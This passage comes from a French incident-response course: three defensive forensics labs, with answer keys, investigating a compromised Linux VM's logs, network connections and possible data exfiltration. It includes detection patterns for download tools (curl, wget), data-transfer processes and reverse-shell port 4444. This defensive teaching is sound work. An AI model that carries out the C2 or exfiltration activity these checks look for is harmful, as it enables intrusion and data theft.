| 3 | Exécutables nouveaux ou modifiés | File and Directory Discovery | T1083 | | | | | |
| 4 | Chronologie d'attaque | Automated Collection | T1119 | | | | | |

> Note — Cet exercice illustre `T1119` (analyse défensive), `T1083` (analyse) et `T1059.004` (commandes shell observées). Ce lab analyse les traces laissées par les payloads exécutés en réel ; il ne lance pas de nouvelle action offensive.

### 1.4 Ce que vous devez observer en Lab 1

**Résultat attendu** :
- extraits pertinents des journaux `auth.log` avec horodatages ;
- liste d'activités suspectes identifiées ;
- au moins 3 types d'IoC documentés (noms d'utilisateurs nouveaux, exécutables, modifications de configuration) ;
- chronologie des événements complète au niveau du jour et de l'heure.

**Critères de réussite de Lab 1** :
- journaux d'authentification analysés avec extraits documentés ;
- activités suspectes identifiées et chronologisées ;
- au moins 3 types d'IoC documentés ;
- chronologie des événements complète au niveau du jour et de l'heure.

### 1.5 Après Lab 1

Passez à Lab 2 — Enquête sur les connexions réseau suspectes.

### 1.6 Corrigé — Lab 1

**Résolution détaillée :**

**Étape 1.1 — Analyse du fichier auth.log**
- **Commande** : `sudo grep -E "Accepted|Failed" /var/log/auth.log`
- **Résultat attendu** : lignes `Accepted` et `Failed` avec horodatages.
- **Explication** : `auth.log` enregistre les authentifications SSH. Le filtre `Accepted|Failed` isole les succès et les échecs.
- **Piège courant** : lire le fichier sans `sudo` ; `auth.log` est protégé en lecture.

**Résultat attendu final** :
- extraits d'authentification affichés ;
- fichier `preuves/ch3-lab1/auth-accepted-failed.txt` présent.

**Étape 1.2 — Recherche d'activités suspectes**
- **Commande** : `sudo grep -i "sudo\|chmod\|chown\|curl\|wget" /var/log/auth.log`
- **Résultat attendu** : lignes contenant `sudo`, `chmod`, `chown`, `curl` ou `wget`.
- **Explication** : ces commandes peuvent indiquer une élévation de privilèges, une modification de permissions ou un téléchargement.
- **Piège courant** : confondre une commande légitime d'administration avec une activité malveillante ; corréler avec l'heure et l'utilisateur.

**Résultat attendu final** :
- activités suspectes listées ;
- fichier `preuves/ch3-lab1/activites-suspectes.txt` présent.

**Étape 1.3 — Identification des exécutables nouveaux ou modifiés**
- **Commande** : `sudo find / -newer /etc/passwd -type f 2>/dev/null`
- **Résultat attendu** : liste des fichiers modifiés après `/etc/passwd`.
- **Explication** : `-newer` compare la date de modification à celle de `/etc/passwd` ; `-type f` limite aux fichiers.
- **Piège courant** : oublier `2>/dev/null` ; les erreurs de permission polluent la sortie.

**Résultat attendu final** :
- fichiers récents listés ;
- fichier `preuves/ch3-lab1/executables-recents.txt` présent.

**Étape 1.4 — Documentation de la chronologie**
- **Action** : concaténer les preuves et classer les événements par heure.
- **Explication** : la chronologie relie les authentifications, les commandes et les fichiers pour reconstituer la séquence.
- **Piège courant** : mélanger les fuseaux horaires ; vérifier l'heure des VM.

**Conclusion Lab 1** :
- journaux d'authentification analysés ;
- activités suspectes et fichiers récents identifiés ;
- chronologie documentée ;
- ATT&CK cartographié : T1119, T1083, T1059.004.

---

## Lab 2 — Enquête sur les connexions réseau suspectes

### 2.1 Contexte et objectif

Après avoir analysé les journaux forensiques, cette étape vous apprend à enquêter sur les connexions réseau sortantes et entrantes sur la machine cible, dans le but d'identifier les canaux de communication établis par un attaquant, les données exfiltrées et les systèmes externes compromis.

**Objectif de Lab 2** — Analyser l'activité réseau pendant la période d'attaque, identifier les connexions établies et déterminer l'étendue de l'exfiltration de données ou de la communication C2 (Command and Control).

**Plan MITRE ATT&CK de Lab 2**

- **Technique** : T1040 Network Sniffing (Credential Access / Discovery, analyse) ; T1071 Application Layer Protocol (Command and Control, analyse) ; T1571 Non-Standard Port (Command and Control, analyse).
- **Tactique** : Credential Access (TA0006) ; Discovery (TA0007) ; Command and Control (TA0011).
- **Source de données** : DS0029 Network Traffic (connexions, ports) ; DS0009 Process (PID et utilisateur) ; DS0038 Domain Name (résolution DNS).
- **Règle de détection** : connexions sortantes inhabituelles, ports non standards, résolutions DNS vers des destinations inconnues.
- **Mitigation** : surveillance du trafic réseau, listes de contrôle d'accès, filtrage de sortie, détection de fuite de données, analyse du trafic C2.
- **Statut** : Couvert (analyse) pour T1040, T1071 et T1571.

### 2.2 Étapes de Lab 2

#### Étape 2.1 — Liste des connexions réseau établies

**Commande** : `ss -tuln` ou `netstat -tuln`

**Contexte** : sur la machine cible Linux (`192.168.56.103`), après l'analyse forensique initiale. L'objectif est de lister toutes les connexions réseau établies.

**Résultat attendu** : liste de toutes les connexions réseau établies avec leurs PID et utilisateur.

```bash
# Sur la cible : connexions réseau établies
mkdir -p preuves/ch3-lab2
sudo ss -tulnp 2>&1 | tee preuves/ch3-lab2/ss-tuln.txt
# Alternative si ss est absent
sudo netstat -tulnp 2>&1 | tee preuves/ch3-lab2/netstat-tuln.txt
```

**Ce que vous devez observer** :
- liste complète des connexions établies avec numéros de port ;
- identification des services en écoute ;
- PID et utilisateur associés à chaque connexion ;
- preuves `preuves/ch3-lab2/ss-tuln.txt` ou `netstat-tuln.txt`.

**L'enregistrement** : notez la liste complète des connexions établies dans votre rapport. Conservez les fichiers de preuve.

#### Étape 2.2 — Identification des connexions sortantes

**Commande** : `ss -t | grep ESTAB` ou `netstat -t | grep ESTAB`

**Contexte** : sur la cible Linux, après avoir listé les connexions établies. L'objectif est d'identifier les connexions sortantes.

**Résultat attendu** : connexions sortantes identifiées avec adresses distantes et ports.

```bash
# Sur la cible : connexions sortantes
ss -t 2>&1 | grep ESTAB | tee preuves/ch3-lab2/connexions-sortantes.txt
# Alternative
netstat -t 2>&1 | grep ESTAB | tee -a preuves/ch3-lab2/connexions-sortantes.txt
```

**Ce que vous devez observer** :
- connexions sortantes avec adresses distantes et ports ;
- ports non standards ou inhabituels ;
- preuve `preuves/ch3-lab2/connexions-sortantes.txt`.

**L'enregistrement** : notez les connexions sortantes identifiées dans votre rapport. Conservez le fichier de preuve.

#### Étape 2.3 — Résolution des adresses distantes

**Commande** : `nslookup <IP>` ou `host <IP>`

**Contexte** : sur la cible Linux, après avoir identifié les connexions sortantes. L'objectif est de résoudre les adresses distantes en noms d'hôtes.

**Résultat attendu** : noms d'hôtes résolus pour les adresses IP distantes.

```bash
# Sur la cible : résolution d'une adresse distante (exemple)
host 192.168.56.1 2>&1 | tee preuves/ch3-lab2/resolution-dns.txt
# ou
nslookup 192.168.56.1 2>&1 | tee -a preuves/ch3-lab2/resolution-dns.txt
```

**Ce que vous devez observer** :
- noms d'hôtes résolus pour les adresses IP distantes ;
- identification potentielle de serveurs C2 ou de destinations d'exfiltration ;
- preuve `preuves/ch3-lab2/resolution-dns.txt`.

**L'enregistrement** : notez les noms d'hôtes résolus dans votre rapport. Conservez le fichier de preuve.

#### Étape 2.4 — Analyse des états de connexion et des ports

**Commande** : `ss -tan` ou `netstat -tan`

**Contexte** : sur la cible Linux, après avoir résolu les adresses distantes. L'objectif est d'analyser les états de connexion et les ports utilisés.

**Résultat attendu** : analyse détaillée des états de connexion et des ports utilisés pendant la période d'attaque.

```bash
# Sur la cible : états de connexion TCP et UDP
ss -tan 2>&1 | tee preuves/ch3-lab2/etats-connexion.txt
ss -uan 2>&1 | tee -a preuves/ch3-lab2/etats-connexion.txt
# Alternative
netstat -tan 2>&1 | tee -a preuves/ch3-lab2/etats-connexion.txt
```

**Ce que vous devez observer** :
- états de connexion (`ESTABLISHED`, `LISTEN`, etc.) ;
- ports utilisés et leurs états ;
- identification des connexions anormales ;
- preuve `preuves/ch3-lab2/etats-connexion.txt`.

**L'enregistrement** : notez l'analyse des états de connexion dans votre rapport. Conservez le fichier de preuve.

#### Étape 2.5 — Recherche de connexions sur des ports non standards

**Commande** : `grep ":<port>" /proc/net/tcp`

**Contexte** : sur la cible Linux, après avoir analysé les états de connexion. L'objectif est de rechercher les connexions sur des ports non standards.

**Résultat attendu** : connexions sur des ports non standards ou inhabituels détectées.

```bash
# Sur la cible : recherche du port 4444 en hexadécimal (115C)
grep -i ":115C" /proc/net/tcp 2>&1 | tee preuves/ch3-lab2/ports-non-standards.txt
```

> **Repère** — Dans `/proc/net/tcp`, les ports sont exprimés en hexadécimal. Le port 4444 décimal correspond à `115C`. Le port 5555 correspond à `15B3`.

**Ce que vous devez observer** :
- connexions sur des ports non standards (par exemple 4444, 5555) ;
- identification potentielle de C2 ou de canaux d'exfiltration ;
- preuve `preuves/ch3-lab2/ports-non-standards.txt`.

**L'enregistrement** : notez les connexions sur ports non standards dans votre rapport. Conservez le fichier de preuve.

### 2.3 Plan d'attaque de Lab 2 à remplir en temps réel

| # | Étape | Technique ATT&CK | ID | Statut | Résultat observé | Détection observée | Mitigation applicable | Notes temps réel |
|---|---|---|---|---|---|---|---|---|
| 1 | Connexions établies | Network Sniffing (analyse) | T1040 | | | | | |
| 2 | Connexions sortantes | Application Layer Protocol | T1071 | | | | | |
| 3 | Résolution DNS | Application Layer Protocol | T1071 | | | | | |
| 4 | Analyse des états de connexion | Network Sniffing (analyse) | T1040 | | | | | |
| 5 | Ports non standards | Non-Standard Port | T1571 | | | | | |

> Note — Cet exercice illustre `T1040` (analyse), `T1071` (analyse du protocole applicatif) et `T1571` (port non standard). Ce lab analyse le trafic capturé après l'exécution réelle des payloads ; il ne lance pas de nouveau scan.

### 2.4 Ce que vous devez observer en Lab 2

**Résultat attendu** :
- liste complète des connexions établies avec PID et utilisateur ;
- connexions sortantes avec adresses IP et ports distants ;
- au moins 1 port non standard détecté et documenté ;
- analyse de la potentielle exfiltration de données ou communication C2.

**Critères de réussite de Lab 2** :
- toutes les connexions établies documentées avec PID et utilisateur ;
- connexions sortantes identifiées et analysées ;
- au moins 1 port non standard détecté et documenté ;
- analyse de risque pour les connexions externes suspectes.

### 2.5 Après Lab 2

Passez à Lab 3 — Analyse de l'exfiltration de données.

### 2.6 Corrigé — Lab 2

**Résolution détaillée :**

**Étape 2.1 — Liste des connexions réseau établies**
- **Commande** : `sudo ss -tulnp`
- **Résultat attendu** : sockets TCP/UDP en écoute, avec PID et utilisateur.
- **Explication** : `-t` TCP, `-u` UDP, `-l` écoute, `-n` ports numériques, `-p` processus.
- **Piège courant** : exécuter `ss` sans `sudo` ; les PID des processus des autres utilisateurs ne sont pas affichés.

**Résultat attendu final** :
- connexions listées ;
- fichier `preuves/ch3-lab2/ss-tuln.txt` présent.

**Étape 2.2 — Identification des connexions sortantes**
- **Commande** : `ss -t | grep ESTAB`
- **Résultat attendu** : connexions TCP établies.
- **Explication** : `ESTAB` filtre les connexions établies ; les adresses distantes apparaissent dans la colonne `Peer Address`.
- **Piège courant** : confondre une connexion locale avec une connexion sortante ; vérifier l'adresse distante.

**Résultat attendu final** :
- connexions sortantes listées ;
- fichier `preuves/ch3-lab2/connexions-sortantes.txt` présent.

**Étape 2.3 — Résolution des adresses distantes**
- **Commande** : `host 192.168.56.1`
- **Résultat attendu** : nom d'hôte ou message `NXDOMAIN`.
- **Explication** : la résolution inverse peut révéler un nom de machine ou confirmer une absence d'enregistrement DNS.
- **Piège courant** : interpréter un `NXDOMAIN` comme une preuve d'attaque ; ce n'est qu'une absence d'enregistrement.

**Résultat attendu final** :
- résolution documentée ;
- fichier `preuves/ch3-lab2/resolution-dns.txt` présent.

**Étape 2.4 — Analyse des états de connexion et des ports**
- **Commande** : `ss -tan`
- **Résultat attendu** : états TCP (`LISTEN`, `ESTABLISHED`, `TIME-WAIT`, etc.).
- **Explication** : un état `SYN-SENT` répété ou un grand nombre de `TIME-WAIT` peut indiquer un balayage ou une saturation.
- **Piège courant** : ne pas corréler l'état avec le PID ; utiliser `-p` quand c'est possible.

**Résultat attendu final** :
- états de connexion documentés ;
- fichier `preuves/ch3-lab2/etats-connexion.txt` présent.

**Étape 2.5 — Recherche de connexions sur des ports non standards**
- **Commande** : `grep -i ":115C" /proc/net/tcp`
- **Résultat attendu** : ligne correspondant au port 4444, ou absence de ligne.
- **Explication** : `/proc/net/tcp` affiche les ports en hexadécimal ; `115C` correspond à 4444.
- **Piège courant** : chercher `:4444` en décimal dans `/proc/net/tcp` ; la recherche ne retourne rien.

**Résultat attendu final** :
- recherche documentée ;
- fichier `preuves/ch3-lab2/ports-non-standards.txt` présent.

**Conclusion Lab 2** :
- connexions établies et sortantes documentées ;
- résolution DNS et états de connexion analysés ;
- ports non standards recherchés ;
- ATT&CK cartographié : T1040, T1071, T1571.

---

## Lab 3 — Analyse de l'exfiltration de données

### 3.1 Contexte et objectif

Après avoir enquêté sur les connexions réseau, cette étape vous permet d'identifier et de documenter les preuves d'exfiltration de données sur la machine cible compromise, afin de déterminer quelles données ont été transférées hors du système, par quelle méthode et vers quelle destination.

**Objectif de Lab 3** — Identifier et documenter les techniques d'exfiltration de données, évaluer le volume de données compromis et tracer la destination des données exfiltrées.

**Plan MITRE ATT&CK de Lab 3**

- **Technique** : T1041 Exfiltration Over C2 Channel (Exfiltration, analyse) ; T1053.003 Scheduled Task/Job: Cron (Execution / Persistence / Privilege Escalation, analyse) ; T1071.001 Application Layer Protocol: Web Protocols (Command and Control, analyse).
- **Tactique** : Exfiltration (TA0010) ; Execution (TA0002) ; Persistence (TA0003) ; Command and Control (TA0011).
- **Source de données** : DS0029 Network Traffic (volume, destination) ; DS0015 Application Log (requêtes HTTP) ; DS0003 Scheduled Job (cron) ; DS0022 File (fichiers volumineux).
- **Règle de détection** : taille des fichiers, contenu des tâches cron, modèles de journal, processus de transfert.
- **Mitigation** : surveillance des transferts de données, règles de contrôle des protocoles, surveillance des tâches cron, prévention de l'exfiltration au niveau du réseau.
- **Statut** : Couvert (analyse) pour T1041, T1053.003 et T1071.001.

### 3.2 Étapes de Lab 3

#### Étape 3.1 — Recherche de grands fichiers récemment créés ou modifiés

**Commande** : `find / -size +1M -type f -mtime -1 2>/dev/null`

**Contexte** : sur la machine cible Linux (`192.168.56.103`), après l'enquête réseau initiale. L'objectif est d'identifier les grands fichiers récemment créés ou modifiés qui pourraient contenir des données exfiltrées.

**Résultat attendu** : liste des grands fichiers récemment créés ou modifiés avec leur taille et leur chemin.

```bash
# Sur la cible : grands fichiers récemment créés
mkdir -p preuves/ch3-lab3
sudo find / -size +1M -type f -mtime -1 2>/dev/null \
  | tee preuves/ch3-lab3/grands-fichiers.txt
```

**Ce que vous devez observer** :
- liste des grands fichiers avec leur taille (en Ko ou Mo) et leur chemin ;
- fichiers pouvant contenir des données structurées ou exfiltrées ;
- preuve `preuves/ch3-lab3/grands-fichiers.txt`.

**L'enregistrement** : notez les grands fichiers dans votre rapport d'exfiltration. Conservez le fichier de preuve.

#### Étape 3.2 — Vérification des tâches cron suspectes

**Commande** : `crontab -l` et `cat /etc/crontab`

**Contexte** : sur la cible Linux, après avoir identifié les grands fichiers. L'objectif est de vérifier les tâches cron qui s'exécutent de manière suspecte.

**Résultat attendu** : tâches cron analysées avec leur contenu.

```bash
# Sur la cible : tâches cron
crontab -l 2>&1 | tee preuves/ch3-lab3/cron-utilisateur.txt
sudo cat /etc/crontab 2>&1 | tee preuves/ch3-lab3/cron-systeme.txt
sudo ls -la /etc/cron.* 2>&1 | tee -a preuves/ch3-lab3/cron-systeme.txt
```

**Ce que vous devez observer** :
- liste des tâches cron configurées ;
- contenu des tâches cron avec horodatages et commandes ;
- tâches cron inhabituelles ou malveillantes ;
- preuves `cron-utilisateur.txt` et `cron-systeme.txt`.

**L'enregistrement** : notez les tâches cron suspectes dans votre rapport d'exfiltration. Conservez les fichiers de preuve.

#### Étape 3.3 — Analyse des processus en cours d'exécution

**Commande** : `ps aux | grep -i -E "transfer|send|upload|download|base64|encode"`

**Contexte** : sur la cible Linux, après avoir vérifié les tâches cron. L'objectif est d'identifier les processus en cours d'exécution liés au transfert de données.

**Résultat attendu** : processus en cours d'exécution pour les activités de transfert de données.

```bash
# Sur la cible : processus de transfert de données
ps aux 2>&1 | grep -i -E "transfer|send|upload|download|base64|encode" \
  | tee preuves/ch3-lab3/processus-transfert.txt
```

**Ce que vous devez observer** :
- processus en cours d'exécution liés au transfert de données ;
- commandes et arguments associés ;
- PID et utilisateur associés aux processus suspects ;
- preuve `preuves/ch3-lab3/processus-transfert.txt`.

**L'enregistrement** : notez les processus de transfert identifiés dans votre rapport d'exfiltration. Conservez le fichier de preuve.

#### Étape 3.4 — Analyse des journaux de réseau

**Commande** : `grep -i "POST\|PUT\|SEND" /var/log/auth.log`

**Contexte** : sur la cible Linux, après avoir analysé les processus en cours d'exécution. L'objectif est d'analyser les journaux pour les modèles de transfert de données.

**Résultat attendu** : modèles de transfert de données dans les journaux analysés.

```bash
# Sur la cible : modèles de transfert dans les logs
sudo grep -i "POST\|PUT\|SEND" /var/log/auth.log \
  2>&1 | tee preuves/ch3-lab3/transferts-logs.txt
```

> **Repère** — `auth.log` contient surtout des événements d'authentification. Les requêtes HTTP se trouvent plutôt dans `/var/log/apache2/access.log`. La commande est conservée pour vérifier l'absence de fuite dans `auth.log` ; complétez l'analyse avec le journal Apache si le service web est actif.

**Ce que vous devez observer** :
- modèles de transfert de données dans les journaux ;
- sources et destinations des transferts ;
- preuve `preuves/ch3-lab3/transferts-logs.txt`.

**L'enregistrement** : notez les modèles de transfert de données dans votre rapport d'exfiltration. Conservez le fichier de preuve.

#### Étape 3.5 — Identification des scripts suspects

**Commande** : `find /home -name "*.sh" -exec ls -la {} \; 2>/dev/null`

**Contexte** : sur la cible Linux, après avoir analysé les journaux. L'objectif est d'identifier les scripts suspects dans les répertoires utilisateur.

**Résultat attendu** : scripts suspects identifiés avec leur contenu et leur localisation.

```bash
# Sur la cible : scripts suspects
sudo find /home -name "*.sh" -exec ls -la {} \; 2>/dev/null \
  | tee preuves/ch3-lab3/scripts-suspects.txt
```

**Ce que vous devez observer** :
- liste des scripts dans les répertoires utilisateur ;
- contenu des scripts suspects ;
- scripts pouvant servir à l'exfiltration de données ;
- preuve `preuves/ch3-lab3/scripts-suspects.txt`.

**L'enregistrement** : notez les scripts suspects dans votre rapport d'exfiltration. Conservez le fichier de preuve.

#### Étape 3.6 — Détermination du volume estimé et de la méthode

**Actions** :
1. Estimer le volume total de données exfiltrées en additionnant les tailles des fichiers suspects.
2. Identifier la méthode de transfert (HTTP, FTP, SMB, base64, etc.).
3. Tracer la destination des données exfiltrées si possible.

```bash
# Sur Kali : synthèse du volume et de la méthode
{
  echo "Volume et méthode — Ch3 Lab3"
  echo "Fichiers suspects :"
  cat preuves/ch3-lab3/grands-fichiers.txt
  echo "Processus de transfert :"
  cat preuves/ch3-lab3/processus-transfert.txt
  echo "Tâches cron :"
  cat preuves/ch3-lab3/cron-systeme.txt
} > preuves/ch3-lab3/synthese-exfiltration.txt 2>&1
```

**L'enregistrement** : déterminez le volume estimé de données exfiltrées et la méthode de transfert dans votre rapport. Conservez `preuves/ch3-lab3/synthese-exfiltration.txt`.

### 3.3 Plan d'attaque de Lab 3 à remplir en temps réel

| # | Étape | Technique ATT&CK | ID | Statut | Résultat observé | Détection observée | Mitigation applicable | Notes temps réel |
|---|---|---|---|---|---|---|---|---|
| 1 | Grands fichiers | Exfiltration Over C2 Channel | T1041 | | | | | |
| 2 | Tâches cron | Scheduled Task/Job: Cron | T1053.003 | | | | | |
| 3 | Processus de transfert | Exfiltration Over C2 Channel | T1041 | | | | | |
| 4 | Journaux réseau | Application Layer Protocol: Web Protocols | T1071.001 | | | | | |
| 5 | Scripts suspects | Exfiltration Over C2 Channel | T1041 | | | | | |

> Note — Cet exercice illustre `T1041` (analyse de l'exfiltration), `T1053.003` (analyse des tâches cron) et `T1071.001` (analyse du protocole web). Ce lab analyse les traces d'exfiltration laissées par les payloads exécutés ; il ne relance pas d'exfiltration.

### 3.4 Ce que vous devez observer en Lab 3

**Résultat attendu** :
- liste des grands fichiers avec tailles et pertinence suspecte ;
- tâches cron suspectes documentées ;
- au moins 1 processus de transfert identifié ;
- modèle d'exfiltration documenté (protocole, destination estimée).

**Critères de réussite de Lab 3** :
- grands fichiers identifiés (au moins 1 fichier de plus de 1 Mo créé ou modifié récemment) ;
- tâches cron suspectes documentées ;
- au moins 1 processus de transfert identifié ;
- modèle d'exfiltration documenté (protocole, destination estimée).

### 3.5 Après Lab 3

Toute la procédure est maintenant terminée. Vous pouvez passer à la synthèse et à la transition vers le chapitre 4.

### 3.6 Corrigé — Lab 3

**Résolution détaillée :**

**Étape 3.1 — Recherche de grands fichiers récemment créés ou modifiés**
- **Commande** : `sudo find / -size +1M -type f -mtime -1 2>/dev/null`
- **Résultat attendu** : fichiers de plus de 1 Mo modifiés dans les dernières 24 heures.
- **Explication** : `-size +1M` filtre la taille, `-mtime -1` la date de modification.
- **Piège courant** : oublier `2>/dev/null` ; les erreurs de permission polluent la sortie.

**Résultat attendu final** :
- grands fichiers listés ;
- fichier `preuves/ch3-lab3/grands-fichiers.txt` présent.

**Étape 3.2 — Vérification des tâches cron suspectes**
- **Commandes** : `crontab -l`, `sudo cat /etc/crontab`
- **Résultat attendu** : tâches cron utilisateur et système.
- **Explication** : une tâche cron peut automatiser un transfert périodique.
- **Piège courant** : ne consulter que `crontab -l` et oublier `/etc/cron.*`.

**Résultat attendu final** :
- tâches cron documentées ;
- fichiers `cron-utilisateur.txt` et `cron-systeme.txt` présents.

**Étape 3.3 — Analyse des processus en cours d'exécution**
- **Commande** : `ps aux | grep -i -E "transfer|send|upload|download|base64|encode"`
- **Résultat attendu** : processus correspondant aux motifs de transfert.
- **Explication** : `ps aux` liste tous les processus ; `grep -i` ignore la casse.
- **Piège courant** : le `grep` se trouve lui-même dans la sortie ; filtrer avec `grep -v grep`.

**Résultat attendu final** :
- processus de transfert documentés ;
- fichier `preuves/ch3-lab3/processus-transfert.txt` présent.

**Étape 3.4 — Analyse des journaux de réseau**
- **Commande** : `sudo grep -i "POST\|PUT\|SEND" /var/log/auth.log`
- **Résultat attendu** : lignes contenant `POST`, `PUT` ou `SEND`, ou absence de ligne.
- **Explication** : `auth.log` ne contient pas les requêtes HTTP ; l'absence de résultat est normale. Compléter avec `/var/log/apache2/access.log`.
- **Piège courant** : conclure à une absence d'exfiltration sur la seule base de `auth.log`.

**Résultat attendu final** :
- analyse documentée ;
- fichier `preuves/ch3-lab3/transferts-logs.txt` présent.

**Étape 3.5 — Identification des scripts suspects**
- **Commande** : `sudo find /home -name "*.sh" -exec ls -la {} \; 2>/dev/null`
- **Résultat attendu** : scripts shell avec permissions et dates.
- **Explication** : un script récent et exécutable dans un répertoire utilisateur est un indicateur à corréler.
- **Piège courant** : ignorer les scripts sans extension `.sh`.

**Résultat attendu final** :
- scripts listés ;
- fichier `preuves/ch3-lab3/scripts-suspects.txt` présent.

**Étape 3.6 — Détermination du volume estimé et de la méthode**
- **Action** : additionner les tailles et qualifier le protocole observé.
- **Explication** : le volume et le protocole orientent la gravité et la réponse.
- **Piège courant** : confondre taille sur disque et volume transféré.

**Conclusion Lab 3** :
- grands fichiers identifiés ;
- tâches cron et processus de transfert analysés ;
- scripts suspects documentés ;
- ATT&CK cartographié : T1041, T1053.003, T1071.001.

---

## 5. Synthèse et transition vers le chapitre 4

### 5.1 Validation finale de Lab 1 à Lab 3

Vérifiez que tous les labs ont été complétés :

- [ ] Lab 1 : analyse des journaux — IoC identifiés, chronologie documentée.
- [ ] Lab 2 : enquête sur les connexions réseau — C2 identifiées, ports analysés.
- [ ] Lab 3 : analyse de l'exfiltration — méthode et volume documentés.

Chaque lab a été cartographié sur MITRE ATT&CK avec sa technique, sa tactique, sa source de données, sa règle de détection et sa mitigation. Tous les résultats ont été documentés dans votre rapport forensique avec statut, résultat observé, détection observée et notes en temps réel.

### 5.2 Transition vers le chapitre 4

Le chapitre 4 reprend les preuves collectées dans ce chapitre pour produire le **rapport forensique standard**, compléter la capture réseau, analyser le trafic dans Wireshark et restaurer l'environnement à son état sain. Le chapitre 3 analyse et interprète ; le chapitre 4 consolide, rapporte et remédie.
